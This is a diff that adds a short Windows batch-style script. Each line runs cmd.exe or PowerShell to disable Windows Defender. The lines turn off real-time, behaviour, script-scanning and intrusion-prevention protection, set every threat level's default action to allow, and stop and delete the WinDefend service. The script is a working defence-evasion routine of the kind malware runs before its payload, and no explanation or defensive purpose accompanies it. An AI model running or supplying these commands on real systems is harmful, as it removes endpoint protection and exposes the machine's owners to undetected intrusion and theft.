@@ -1,0 +1,18 @@
+cmd.exe /c powershell Set-MpPreference -DisableRealTimeMonitoring $true
+cmd.exe /c powershell Set-MpPreference -DisableIntrusionPreventionSystem $true
+cmd.exe /c powershell Set-MpPreference -DisableIOAVProtection $true
+
+cmd.exe /c sc delete WinDefend
+cmd.exe /c sc stop WinDefend
+
+
+cmd.exe /c powershell Set-MpPreference -DisableScriptScanning $true
+cmd.exe /c powershell Set-MpPreference -ModerateThreatDefaultAction 6
+cmd.exe /c powershell Set-MpPreference -LowThreatDefaultAction 6
+cmd.exe /c powershell Set-MpPreference -SevereThreatDefaultAction 6
+cmd.exe /c powershell Set-MpPreference -DisableIntrusionPreventionSystem $true
+cmd.exe /c powershell Set-MpPreference -DisablePrivacyMode $true
+cmd.exe /c powershell Set-MpPreference -DisableBlockAtFirstSeen $true
+cmd.exe /c powershell Set-MpPreference -DisableBehaviorMonitoring $true
+cmd.exe /c powershell Set-MpPreference -DisableRealtimeMonitoring $true
+
